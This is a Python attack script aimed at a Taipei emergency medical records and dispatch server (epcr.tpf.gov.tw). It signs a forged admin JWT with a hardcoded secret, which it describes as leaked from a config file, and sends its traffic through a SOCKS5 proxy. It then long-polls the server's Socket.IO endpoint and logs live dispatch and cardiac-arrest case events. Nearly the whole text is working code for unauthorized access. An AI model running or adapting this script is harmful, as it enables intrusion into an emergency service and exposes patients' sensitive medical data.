#!/usr/bin/env python3
"""EPCR continuous monitor -- Taipei City real-time dispatch listener.
Chains long-polling sessions every ~20s to catch real-time dispatch/OHCA events.
Uses forged admin JWT (secret leaked from epcr_config.csv).
"""
import json, time, re, datetime
import requests, jwt as pyjwt
import warnings
warnings.filterwarnings('ignore')

# Config
PROXY = 'socks5://202.160.76.157:11081'
S = {'https': PROXY}
SECRET = 'ru/3xu4dkru4888'
SERVER = 'epcr.tpf.gov.tw'
SOCKET_PORT = 4004
POLL_TIMEOUT = 15
RECONNECT_INTERVAL = 1
MAX_RUNTIME = 240
EVENTS_FOUND = 0
OUTPUT_FILE = '/tmp/tpe119_epcr_monitor_output.txt'

def forge_jwt():
    now = datetime.datetime.now(datetime.timezone.utc)
    return pyjwt.encode({
        'sub': '1', 'account': 'admin', 'role': 'ADMIN',
        'iat': int(now.timestamp()),
        'exp': int((now + datetime.timedelta(hours=48)).timestamp()),
        'permissions': [
            'DOCTOR_TEST_PUSH', 'MONITOR_ALL', 'EPCR_CASERECORD_READ',
            'EPCR_PAGE_CASELIST', 'EPCR_PAGE_CASEDETAIL', 'EPCR_PAGE_OHCA',
            'EPCR_PAGE_OHCACASELIST', 'AUTH_USER_ALL',
            'EPCR_OFFICIALCASE', 'DOCTOR_INSTRUCT_ALL',
        ],
    }, SECRET, algorithm='HS256')

def safe_parse(text):
    """Parse engine.io v4 polling response packets (format: <len>:<data>)"""
    packets = []
    i = 0
    while i < len(text):
        m = re.match(r'(\d+):', text[i:])
        if not m:
            break
        length = int(m.group(1))
        sep_len = m.end()
        data_start = i + sep_len
        data_end = data_start + length
        if data_end > len(text):
            break
        data = text[data_start:data_end]
        packets.append(data)
        i = data_end
    return packets

def interpret_packet(data):
    """Interpret Socket.IO v4 packets from engine.io messages"""
    if len(data) > 0 and data[0] == '4':
        sio = data[1:]
        types = {0: 'CONNECT', 1: 'DISCONNECT', 2: 'EVENT', 3: 'ACK', 4: 'CONNECT_ERROR'}
        stype = types.get(int(sio[0]), f'UNKNOWN({sio[0]})')
        return f'EVENT: Socket.IO {stype} -- {sio[1:][:300]}'
    elif data[0] == '0':
        return f'OPEN: {data[1:][:200]}'
    elif data[0] == '2':
        return 'PING'
    elif data[0] == '3':
        return 'PONG'
    else:
        return f'Packet type={data[0]}: {data[1:][:300]}'

# Start logging
print('=' * 60)
print(f'EPCR Taipei -- Real-time Dispatch Monitor (OHCA mode)')
print(f'Server: {SERVER}:{SOCKET_PORT}')
print(f'JWT Secret: {SECRET} (leaked)')
print(f'Monitoring: {MAX_RUNTIME}s ({MAX_RUNTIME//POLL_TIMEOUT} cycles)')
print('=' * 60)

log_f = open(OUTPUT_FILE, 'w')
log_f.write(f'EPCR Monitor Started: {datetime.datetime.now()}\n')
log_f.write(f'Server: {SERVER}:{SOCKET_PORT}\n')
log_f.write(f'JWT Secret: {SECRET}\n\n')

start_time = time.time()
cycle = 0

while time.time() - start_time < MAX_RUNTIME:
    cycle += 1
    elapsed = time.time() - start_time
    now_str = time.strftime('%H:%M:%S')
    poll_start = time.time()
    sid = None

    # Step 1: Handshake
    try:
        resp = requests.get(
            f'https://{SERVER}:{SOCKET_PORT}/socket.io/',
            params={'EIO': '4', 'transport': 'polling'},
            proxies=S, verify=False, timeout=10
        )
        sid_m = re.search(r'"sid":"([^"]+)"', resp.text)
        if sid_m and resp.status_code == 200:
            sid = sid_m.group(1)
            srv_init = ' (server-initiated CONNECT)' if '2:40' in resp.text else ''
            print(f'  [{now_str}] [Cycle {cycle}] Handshake: sid={sid}{srv_init}')
            log_f.write(f'Cycle {cycle}: Handshake sid={sid}\n')
        else:
            print(f'  [{now_str}] Cycle {cycle} Handshake failed: {resp.status_code}')
            time.sleep(2)
            continue
    except Exception as e:
        print(f'  [{now_str}] Cycle {cycle} Handshake error: {str(e)[:80]}')
        time.sleep(2)
        continue

    # Step 2: CONNECT with forged JWT (proper engine.io framing)
    token = forge_jwt()
    connect_msg = f'40{json.dumps({"token": token})}'
    connect_body = f'{len(connect_msg)}:{connect_msg}'

    try:
        resp2 = requests.post(
            f'https://{SERVER}:{SOCKET_PORT}/socket.io/',
            params={'EIO': '4', 'transport': 'polling', 'sid': sid},
            data=connect_body,
            proxies=S, verify=False, timeout=8
        )
        if resp2.status_code == 200:
            result = resp2.text if len(resp2.text) < 50 else resp2.text[:50]
            print(f'  [{now_str}] CONNECT (JWT): 200 -- {result}')
            log_f.write(f'Cycle {cycle}: CONNECT 200 -- {resp2.text[:100]}\n')
        else:
            print(f'  [{now_str}] CONNECT: {resp2.status_code} -- {resp2.text[:80]}')
            log_f.write(f'Cycle {cycle}: CONNECT {resp2.status_code}\n')
    except Exception as e:
        print(f'  [{now_str}] CONNECT error: {str(e)[:80]}')
        log_f.write(f'Cycle {cycle}: CONNECT error: {str(e)[:80]}\n')

    # Step 3: Long-poll for real-time events
    try:
        resp3 = requests.get(
            f'https://{SERVER}:{SOCKET_PORT}/socket.io/',
            params={'EIO': '4', 'transport': 'polling', 'sid': sid},
            proxies=S, verify=False, timeout=POLL_TIMEOUT
        )
        poll_dur = time.time() - poll_start

        if resp3.status_code == 400 and 'Session' in resp3.text:
            print(f'  [{now_str}] Session invalidated (400) -- reconnecting')
            log_f.write(f'Cycle {cycle}: Session ID unknown\n')
        elif resp3.status_code == 200 and resp3.text.strip():
            packets = safe_parse(resp3.text)
            for pkt in packets:
                interp = interpret_packet(pkt)
                ts = time.strftime('%H:%M:%S')
                print(f'  [{ts}] RECV: {interp}')
                log_f.write(f'Cycle {cycle}: {interp}\n')
                EVENTS_FOUND += 1
            if not packets:
                print(f'  [{now_str}] Poll {poll_dur:.0f}s (empty/ok)')
            else:
                print(f'  [{now_str}] Poll {poll_dur:.0f}s ({len(packets)} packets)')
            log_f.write(f'Cycle {cycle}: Poll done in {poll_dur:.1f}s\n')
        else:
            print(f'  [{now_str}] Poll {poll_dur:.0f}s (no data)')
            log_f.write(f'Cycle {cycle}: Poll {poll_dur:.0f}s (no data)\n')

    except requests.exceptions.ReadTimeout:
        poll_dur = time.time() - poll_start
        print(f'  [{now_str}] Long-poll timeout ({poll_dur:.0f}s) -- no events')
        log_f.write(f'Cycle {cycle}: Long-poll timeout ({poll_dur:.0f}s)\n')
    except Exception as e:
        print(f'  [{now_str}] Poll error: {str(e)[:60]}')
        log_f.write(f'Cycle {cycle}: Poll error: {str(e)[:60]}\n')

    time.sleep(RECONNECT_INTERVAL)

log_f.write(f'\n=== Monitor Done ===\nCycles: {cycle}, Events: {EVENTS_FOUND}, Duration: {time.time()-start_time:.0f}s\n')
log_f.close()

print(f'\n{"=" * 60}')
print(f'監控結束 | Cycles: {cycle}, Events: {EVENTS_FOUND}, Duration: {time.time()-start_time:.0f}s')
print(f'Full log: {OUTPUT_FILE}')
print(f'{"=" * 60}')
